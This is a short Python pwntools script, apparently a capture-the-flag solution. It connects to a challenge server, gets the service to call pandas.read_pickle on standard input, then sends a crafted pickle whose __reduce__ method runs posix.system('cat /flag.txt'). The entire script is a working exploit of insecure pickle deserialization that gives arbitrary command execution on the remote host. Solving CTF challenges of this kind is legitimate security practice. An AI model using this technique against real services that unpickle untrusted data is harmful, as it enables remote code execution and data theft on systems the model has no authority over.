#!/usr/bin/env python3
from pwn import *
import pickle
import posix

context.log_level = "critical"

p = remote("0.cloud.chals.io", 17738)
p.recvuntil(b">>>")
v = "pandas.read_pickle(sys.stdin.buffer)"
p.sendline(v.encode("utf-8"))

class payload:
    def __reduce__(self):
        return (posix.system, ('cat /flag.txt',))

payload = pickle.dumps(payload())
p.send(payload)

result = b""
while True:
    try:
        result += p.recv()
    except:
        break

if b"Nope" not in result and b"Wrong" not in result:
    print(v)
    print(result.decode())
else:
    print(result)
    print("bad", v)
